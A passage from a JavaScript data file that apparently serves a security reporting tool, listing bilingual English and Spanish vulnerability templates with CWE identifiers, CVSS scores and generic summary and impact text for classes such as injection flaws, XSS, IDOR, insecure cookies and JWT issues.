        overview_en: "### Summary\nA buffer overflow is a type of vulnerability that allows an attacker to write data to a buffer that is larger than the buffer's size. This can be used to overwrite adjacent memory, which can lead to a full system compromise.\n\n---\n\n### Impact\nAn attacker can execute arbitrary code, which can lead to a full system compromise.",
        overview_es: "### Resumen\nUn desbordamiento de búfer es un tipo de vulnerabilidad que permite a un atacante escribir datos en un búfer que es más grande que el tamaño del búfer. Esto se puede usar para sobrescribir la memoria adyacente, lo que puede llevar a un compromiso total del sistema.\n\n---\n\n### Impacto\nUn atacante puede ejecutar código arbitrario, lo que puede llevar a un compromiso total del sistema.",
        references: ["https://owasp.org/www-community/vulnerabilities/Buffer_Overflow"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-071",
        title_en: "Format String Vulnerabilities",
        title_es: "Vulnerabilidades de Cadena de Formato",
        cwe: "CWE-134",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nA format string vulnerability is a type of vulnerability that allows an attacker to read from or write to arbitrary memory locations. This is often the result of an application that uses user-supplied input as a format string.\n\n---\n\n### Impact\nAn attacker can read sensitive information from memory, or write to arbitrary memory locations, which can lead to a full system compromise.",
        overview_es: "### Resumen\nUna vulnerabilidad de cadena de formato es un tipo de vulnerabilidad que permite a un atacante leer o escribir en ubicaciones de memoria arbitrarias. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario como una cadena de formato.\n\n---\n\n### Impacto\nUn atacante puede leer información sensible de la memoria o escribir en ubicaciones de memoria arbitrarias, lo que puede llevar a un compromiso total del sistema.",
        references: ["https://owasp.org/www-community/attacks/Format_string_attack"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-072",
        title_en: "Race Conditions",
        title_es: "Condiciones de Carrera",
        cwe: "CWE-362",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "L" },
        overview_en: "### Summary\nA race condition is a type of vulnerability that allows an attacker to exploit a flaw in the application's handling of concurrent operations to cause unintended behavior, such as bypassing security checks or corrupting data.\n\n---\n\n### Impact\nRace conditions can lead to data corruption, financial loss, and bypass of security logic. The impact is highly dependent on the specific context.",
        overview_es: "### Resumen\nUna condición de carrera es un tipo de vulnerabilidad que permite a un atacante explotar un fallo en el manejo de operaciones concurrentes de la aplicación para causar un comportamiento no deseado, como eludir controles de seguridad o corromper datos.\n\n---\n\n### Impacto\nLas condiciones de carrera pueden conducir a la corrupción de datos, pérdidas financieras y la elusión de la lógica de seguridad. El impacto depende en gran medida del contexto específico.",
        references: ["https://portswigger.net/web-security/race-conditions"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-073",
        title_en: "LDAP Injection",
        title_es: "Inyección LDAP",
        cwe: "CWE-90",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nLDAP injection is a type of vulnerability that allows an attacker to execute arbitrary LDAP queries. This is often the result of an application that uses user-supplied input to construct an LDAP query.\n\n---\n\n### Impact\nAn attacker can bypass authentication, read sensitive information from the directory, or modify the contents of the directory.",
        overview_es: "### Resumen\nLa inyección LDAP es un tipo de vulnerabilidad que permite a un atacante ejecutar consultas LDAP arbitrarias. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una consulta LDAP.\n\n---\n\n### Impacto\nUn atacante puede eludir la autenticación, leer información sensible del directorio o modificar el contenido del directorio.",
        references: ["https://owasp.org/www-community/attacks/LDAP_Injection"],
        tags: ["Additional", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-074",
        title_en: "XPath Injection",
        title_es: "Inyección XPath",
        cwe: "CWE-643",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nXPath injection is a type of vulnerability that allows an attacker to execute arbitrary XPath queries. This is often the result of an application that uses user-supplied input to construct an XPath query.\n\n---\n\n### Impact\nAn attacker can bypass authentication, read sensitive information from the XML document, or modify the contents of the XML document.",
        overview_es: "### Resumen\nLa inyección XPath es un tipo de vulnerabilidad que permite a un atacante ejecutar consultas XPath arbitrarias. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una consulta XPath.\n\n---\n\n### Impacto\nUn atacante puede eludir la autenticación, leer información sensible del documento XML o modificar el contenido del documento XML.",
        references: ["https://owasp.org/www-community/attacks/XPATH_Injection"],
        tags: ["Additional", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-075",
        title_en: "Server-Side Template Injection",
        title_es: "Inyección de Plantillas del Servidor",
        cwe: "CWE-94",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nServer-side template injection is a type of vulnerability that allows an attacker to execute arbitrary code on the server. This is often the result of an application that uses user-supplied input to construct a template.\n\n---\n\n### Impact\nAn attacker can execute arbitrary code on the server, which can lead to a full system compromise.",
        overview_es: "### Resumen\nLa inyección de plantillas del lado del servidor es un tipo de vulnerabilidad que permite a un atacante ejecutar código arbitrario en el servidor. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una plantilla.\n\n---\n\n### Impacto\nUn atacante puede ejecutar código arbitrario en el servidor, lo que puede llevar a un compromiso total del sistema.",
        references: ["https://portswigger.net/web-security/server-side-template-injection"],
        tags: ["Additional", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-076",
        title_en: "Open-Source Vulnerabilities",
        title_es: "Vulnerabilidades en Código Abierto",
        cwe: "CWE-1104",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nUsing open-source libraries with known vulnerabilities is a common way that systems are compromised. This includes libraries, frameworks, and other software modules.\n\n---\n\n### Impact\nDepending on the vulnerability, an attacker could gain complete control of the affected system.",
        overview_es: "### Resumen\nEl uso de bibliotecas de código abierto con vulnerabilidades conocidas es una forma común en que los sistemas se ven comprometidos. Esto incluye bibliotecas, marcos y otros módulos de software.\n\n---\n\n### Impacto\nDependiendo de la vulnerabilidad, un atacante podría obtener el control completo del sistema afectado.",
        references: ["https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-077",
        title_en: "Insecure Direct Object References (IDOR)",
        title_es: "Referencias Directas a Objetos Inseguras (IDOR)",
        cwe: "CWE-639",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nAn insecure direct object reference is a type of vulnerability that allows an attacker to gain unauthorized access to a system. This is often the result of an application that uses user-supplied input to access a resource without proper authorization checks.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to other users' data, such as their profiles, messages, or other sensitive information.",
        overview_es: "### Resumen\nUna referencia directa a objeto insegura es un tipo de vulnerabilidad que permite a un atacante obtener acceso no autorizado a un sistema. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para acceder a un recurso sin las comprobaciones de autorización adecuadas.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a los datos de otros usuarios, como sus perfiles, mensajes u otra información sensible.",
        references: ["https://owasp.org/www-project-top-ten/2013/a4-insecure-direct-object-references"],
        tags: ["Additional", "Access Control"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-078",
        title_en: "Missing Security Headers",
        title_es: "Cabeceras de Seguridad Faltantes",
        cwe: "CWE-693",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "L", availability: "N" },
        overview_en: "### Summary\nMissing security headers can leave a web application vulnerable to a variety of attacks. This includes headers like `Content-Security-Policy`, `X-Content-Type-Options`, and `X-Frame-Options`.\n\n---\n\n### Impact\nAn attacker can exploit the lack of security headers to perform attacks like cross-site scripting, clickjacking, and content sniffing.",
        overview_es: "### Resumen\nLa falta de cabeceras de seguridad puede dejar una aplicación web vulnerable a una variedad de ataques. Esto incluye cabeceras como `Content-Security-Policy`, `X-Content-Type-Options` y `X-Frame-Options`.\n\n---\n\n### Impacto\nUn atacante puede explotar la falta de cabeceras de seguridad para realizar ataques como cross-site scripting, clickjacking y content sniffing.",
        references: ["https://owasp.org/www-project-secure-headers/"],
        tags: ["Additional", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-079",
        title_en: "Clickjacking",
        title_es: "Secuestro de Clics",
        cwe: "CWE-1021",
        severity: "Medium",
        cvss: { score: 5.4, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nClickjacking is a type of vulnerability that allows an attacker to trick a user into clicking on something different from what the user perceives. This is often the result of an application that does not properly protect itself from being framed.\n\n---\n\n### Impact\nAn attacker can trick a user into performing unintended actions, such as making a purchase or changing their password.",
        overview_es: "### Resumen\nEl secuestro de clics es un tipo de vulnerabilidad que permite a un atacante engañar a un usuario para que haga clic en algo diferente de lo que el usuario percibe. Esto suele ser el resultado de una aplicación que no se protege adecuadamente de ser enmarcada.\n\n---\n\n### Impacto\nUn atacante puede engañar a un usuario para que realice acciones no deseadas, como realizar una compra o cambiar su contraseña.",
        references: ["https://owasp.org/www-community/attacks/Clickjacking"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-080",
        title_en: "DOM-based XSS",
        title_es: "XSS Basado en DOM",
        cwe: "CWE-79",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nDOM-based XSS is a type of vulnerability that allows an attacker to execute arbitrary code in a user's browser. This is often the result of an application that uses user-supplied input to modify the DOM.\n\n---\n\n### Impact\nAn attacker can execute arbitrary code in a user's browser, which can be used to steal sensitive information or to perform unauthorized actions.",
        overview_es: "### Resumen\nEl XSS basado en DOM es un tipo de vulnerabilidad que permite a un atacante ejecutar código arbitrario en el navegador de un usuario. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para modificar el DOM.\n\n---\n\n### Impacto\nUn atacante puede ejecutar código arbitrario en el navegador de un usuario, lo que se puede utilizar para robar información sensible o para realizar acciones no autorizadas.",
        references: ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
        tags: ["Additional", "XSS", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-081",
        title_en: "Unrestricted File Upload",
        title_es: "Subida de Archivos sin Restricciones",
        cwe: "CWE-434",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nAn unrestricted file upload vulnerability allows an attacker to upload a malicious file to a server. This is often the result of an application that does not properly validate the type or contents of a file before allowing it to be uploaded.\n\n---\n\n### Impact\nAn attacker can upload a malicious file, such as a web shell, which can be used to execute arbitrary code on the server.",
        overview_es: "### Resumen\nUna vulnerabilidad de subida de archivos sin restricciones permite a un atacante subir un archivo malicioso a un servidor. Esto suele ser el resultado de una aplicación que no valida correctamente el tipo o el contenido de un archivo antes de permitir su subida.\n\n---\n\n### Impacto\nUn atacante puede subir un archivo malicioso, como un shell web, que se puede utilizar para ejecutar código arbitrario en el servidor.",
        references: ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-082",
        title_en: "Business Logic Flaws",
        title_es: "Fallos en la Lógica de Negocio",
        cwe: "CWE-840",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nBusiness logic flaws are a type of vulnerability that allows an attacker to abuse the functionality of an application to cause unintended behavior. This is often the result of an application that does not properly validate user-supplied input.\n\n---\n\n### Impact\nThe impact of a business logic flaw is highly dependent on the specific context. It can lead to financial loss, data corruption, or bypass of security logic.",
        overview_es: "### Resumen\nLos fallos en la lógica de negocio son un tipo de vulnerabilidad que permite a un atacante abusar de la funcionalidad de una aplicación para causar un comportamiento no deseado. Esto suele ser el resultado de una aplicación que no valida correctamente la entrada proporcionada por el usuario.\n\n---\n\n### Impacto\nEl impacto de un fallo en la lógica de negocio depende en gran medida del contexto específico. Puede conducir a pérdidas financieras, corrupción de datos o elusión de la lógica de seguridad.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Business_Logic_Testing/01-Introduction_to_Business_Logic_Testing"],
        tags: ["Additional"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-083",
        title_en: "API Security Misconfiguration",
        title_es: "Configuración Insegura de API",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nAn API security misconfiguration can allow an attacker to gain unauthorized access to a system. This is often the result of a misconfigured API that allows anonymous access or has weak permissions.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a system, which can lead to a full system compromise. It also increases the attack surface of the organization.",
        overview_es: "### Resumen\nUna configuración de seguridad de API incorrecta puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de una API mal configurada que permite el acceso anónimo o tiene permisos débiles.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a un sistema, lo que puede llevar a un compromiso total del sistema. También aumenta la superficie de ataque de la organización.",
        references: ["https://owasp.org/www-project-api-security/"],
        tags: ["Additional", "API", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-084",
        title_en: "Insecure Cookies",
        title_es: "Cookies Inseguras",
        cwe: "CWE-1004",
        severity: "Medium",
        cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
        overview_en: "### Summary\nInsecure cookies can allow an attacker to gain unauthorized access to a system. This is often the result of a cookie that is not properly secured, for example by not setting the `HttpOnly` or `Secure` flags.\n\n---\n\n### Impact\nAn attacker can steal a user's session cookie and gain unauthorized access to their account.",
        overview_es: "### Resumen\nLas cookies inseguras pueden permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de una cookie que no está debidamente protegida, por ejemplo, al no establecer las banderas `HttpOnly` o `Secure`.\n\n---\n\n### Impacto\nUn atacante puede robar la cookie de sesión de un usuario y obtener acceso no autorizado a su cuenta.",
        references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes"],
        tags: ["Additional", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-085",
        title_en: "HTTP Response Splitting",
        title_es: "División de Respuestas HTTP",
        cwe: "CWE-113",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nHTTP response splitting is a type of vulnerability that allows an attacker to inject arbitrary headers into an HTTP response. This is often the result of an application that uses user-supplied input to construct an HTTP response header.\n\n---\n\n### Impact\nAn attacker can perform a variety of attacks, such as cross-site scripting, cache poisoning, and session fixation.",
        overview_es: "### Resumen\nLa división de respuestas HTTP es un tipo de vulnerabilidad que permite a un atacante inyectar cabeceras arbitrarias en una respuesta HTTP. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una cabecera de respuesta HTTP.\n\n---\n\n### Impacto\nUn atacante puede realizar una variedad de ataques, como cross-site scripting, envenenamiento de caché y fijación de sesión.",
        references: ["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-086",
        title_en: "Web Cache Poisoning",
        title_es: "Envenenamiento de Caché Web",
        cwe: "CWE-444",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "N", integrity: "H", availability: "N" },
        overview_en: "### Summary\nWeb cache poisoning is a type of vulnerability that allows an attacker to inject a malicious response into a web cache. This is often the result of an application that uses user-supplied input to construct a cache key.\n\n---\n\n### Impact\nAn attacker can serve a malicious response to any user that requests the poisoned cache entry. This can be used to perform attacks like cross-site scripting or to distribute malware.",
        overview_es: "### Resumen\nEl envenenamiento de caché web es un tipo de vulnerabilidad que permite a un atacante inyectar una respuesta maliciosa en una caché web. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una clave de caché.\n\n---\n\n### Impacto\nUn atacante puede servir una respuesta maliciosa a cualquier usuario que solicite la entrada de caché envenenada. Esto se puede utilizar para realizar ataques como cross-site scripting o para distribuir malware.",
        references: ["https://portswigger.net/web-security/web-cache-poisoning"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-087",
        title_en: "Host Header Injection",
        title_es: "Inyección en Cabecera Host",
        cwe: "CWE-74",
        severity: "Medium",
        cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nHost header injection is a type of vulnerability that allows an attacker to inject a malicious value into the Host header. This is often the result of an application that uses the Host header to construct a URL.\n\n---\n\n### Impact\nAn attacker can perform a variety of attacks, such as password reset poisoning, web cache poisoning, and manipulation of server-side logic.",
        overview_es: "### Resumen\nLa inyección de cabecera Host es un tipo de vulnerabilidad que permite a un atacante inyectar un valor malicioso en la cabecera Host. Esto suele ser el resultado de una aplicación que utiliza la cabecera Host para construir una URL.\n\n---\n\n### Impacto\nUn atacante puede realizar una variedad de ataques, como el envenenamiento del restablecimiento de contraseña, el envenenamiento de la caché web y la manipulación de la lógica del lado del servidor.",
        references: ["https://portswigger.net/web-security/host-header"],
        tags: ["Additional", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-088",
        title_en: "SQLi Blind",
        title_es: "Inyección SQL Ciega",
        cwe: "CWE-89",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nBlind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the application's response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the SQL injection vulnerability.\n\n---\n\n### Impact\nAn attacker can exfiltrate data from the database, even when no data is directly returned from the application. It can be used to gain unauthorized access, modify data, or execute administrative operations on the database.",
        overview_es: "### Resumen\nLa inyección SQL ciega es un tipo de ataque de inyección SQL que le hace a la base de datos preguntas de verdadero o falso y determina la respuesta en función de la respuesta de la aplicación. Este ataque se usa a menudo cuando la aplicación web está configurada para mostrar mensajes de error genéricos, pero no ha mitigado la vulnerabilidad de inyección SQL.\n\n---\n\n### Impacto\nUn atacante puede exfiltrar datos de la base de datos, incluso cuando la aplicación no devuelve datos directamente. Se puede utilizar para obtener acceso no autorizado, modificar datos o ejecutar operaciones administrativas en la base de datos.",
        references: ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
        tags: ["Additional", "Injection", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-089",
        title_en: "OS Command Injection",
        title_es: "Inyección de Comandos del SO",
        cwe: "CWE-78",
        severity: "Critical",
        cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nOS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.\n\n---\n\n### Impact\nAn attacker can execute arbitrary commands on the host operating system, which can lead to a full system compromise.",
        overview_es: "### Resumen\nLa inyección de comandos del SO es una vulnerabilidad de seguridad web que permite a un atacante ejecutar comandos arbitrarios del sistema operativo (SO) en el servidor que ejecuta una aplicación y, por lo general, comprometer por completo la aplicación y todos sus datos.\n\n---\n\n### Impacto\nUn atacante puede ejecutar comandos arbitrarios en el sistema operativo anfitrión, lo que puede llevar a un compromiso total del sistema.",
        references: ["https://owasp.org/www-community/attacks/Command_Injection"],
        tags: ["Additional", "Injection"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-090",
        title_en: "XSS Persistent",
        title_es: "XSS Persistente",
        cwe: "CWE-79",
        severity: "High",
        cvss: { score: 8.0, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "L" },
        overview_en: "### Summary\nPersistent XSS is a type of XSS vulnerability where the malicious script is stored on the target server. When a user visits the affected page, the malicious script is served to their browser and executed.\n\n---\n\n### Impact\nAn attacker can execute arbitrary code in a user's browser, which can be used to steal sensitive information or to perform unauthorized actions.",
        overview_es: "### Resumen\nEl XSS persistente es un tipo de vulnerabilidad XSS en la que el script malicioso se almacena en el servidor de destino. Cuando un usuario visita la página afectada, el script malicioso se sirve a su navegador y se ejecuta.\n\n---\n\n### Impacto\nUn atacante puede ejecutar código arbitrario en el navegador de un usuario, lo que se puede utilizar para robar información sensible o para realizar acciones no autorizadas.",
        references: ["https://owasp.org/www-community/attacks/xss/"],
        tags: ["Additional", "XSS", "Web"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-091",
        title_en: "CSRF Token Leakage",
        title_es: "Filtración de Tokens CSRF",
        cwe: "CWE-352",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "N" },
        overview_en: "### Summary\nA CSRF token leakage vulnerability allows an attacker to obtain a valid CSRF token. This can be used to perform a CSRF attack, even if the application uses CSRF tokens.\n\n---\n\n### Impact\nAn attacker can perform a CSRF attack, which can be used to perform unauthorized actions on behalf of a user.",
        overview_es: "### Resumen\nUna vulnerabilidad de filtración de tokens CSRF permite a un atacante obtener un token CSRF válido. Esto se puede utilizar para realizar un ataque CSRF, incluso si la aplicación utiliza tokens CSRF.\n\n---\n\n### Impacto\nUn atacante puede realizar un ataque CSRF, que se puede utilizar para realizar acciones no autorizadas en nombre de un usuario.",
        references: ["https://portswigger.net/web-security/csrf/tokens"],
        tags: ["Additional", "Session"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-092",
        title_en: "JWT Vulnerabilities",
        title_es: "Vulnerabilidades en JWT",
        cwe: "CWE-345",
        severity: "High",
        cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
        overview_en: "### Summary\nJWT vulnerabilities can allow an attacker to bypass authentication and gain unauthorized access to a system. This can be the result of a weak secret, a flawed implementation, or a library that has known vulnerabilities.\n\n---\n\n### Impact\nAn attacker can bypass authentication and gain unauthorized access to a system.",
        overview_es: "### Resumen\nLas vulnerabilidades de JWT pueden permitir que un atacante eluda la autenticación y obtenga acceso no autorizado a un sistema. Esto puede ser el resultado de un secreto débil, una implementación defectuosa o una biblioteca que tiene vulnerabilidades conocidas.\n\n---\n\n### Impacto\nUn atacante puede eludir la autenticación y obtener acceso no autorizado a un sistema.",
        references: ["https://portswigger.net/web-security/jwt"],
        tags: ["Additional", "Authentication"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-093",
        title_en: "OAuth Misconfiguration",
        title_es: "Configuración Incorrecta de OAuth",
        cwe: "CWE-16",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nAn OAuth misconfiguration can allow an attacker to gain unauthorized access to a system. This is often the result of a misconfigured OAuth provider or a flawed implementation.\n\n---\n\n### Impact\nAn attacker can gain unauthorized access to a user's account, which can be used to steal sensitive information or to perform unauthorized actions.",
        overview_es: "### Resumen\nUna configuración incorrecta de OAuth puede permitir que un atacante obtenga acceso no autorizado a un sistema. Esto suele ser el resultado de un proveedor de OAuth mal configurado o una implementación defectuosa.\n\n---\n\n### Impacto\nUn atacante puede obtener acceso no autorizado a la cuenta de un usuario, que se puede utilizar para robar información sensible o para realizar acciones no autorizadas.",
        references: ["https://portswigger.net/web-security/oauth"],
        tags: ["Additional", "Authentication", "Configuration"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-094",
        title_en: "GraphQL Injection",
        title_es: "Inyección GraphQL",
        cwe: "CWE-943",
        severity: "High",
        cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
        overview_en: "### Summary\nGraphQL injection is a type of vulnerability that allows an attacker to execute arbitrary GraphQL queries. This is often the result of an application that uses user-supplied input to construct a GraphQL query.\n\n---\n\n### Impact\nAn attacker can bypass authentication, read sensitive information from the database, or modify the contents of the database.",
        overview_es: "### Resumen\nLa inyección GraphQL es un tipo de vulnerabilidad que permite a un atacante ejecutar consultas GraphQL arbitrarias. Esto suele ser el resultado de una aplicación que utiliza la entrada proporcionada por el usuario para construir una consulta GraphQL.\n\n---\n\n### Impacto\nUn atacante puede eludir la autenticación, leer información sensible de la base de datos o modificar el contenido de la base de datos.",
        references: ["https://graphql.org/learn/security/"],
        tags: ["Additional", "Injection", "API"],
        ...emptyVulnBoilerplate
    },
    {
        id: "vuln-add-095",
        title_en: "WebSocket Security Issues",
        title_es: "Problemas de Seguridad en WebSocket",
        cwe: "CWE-295",
        severity: "Medium",
        cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
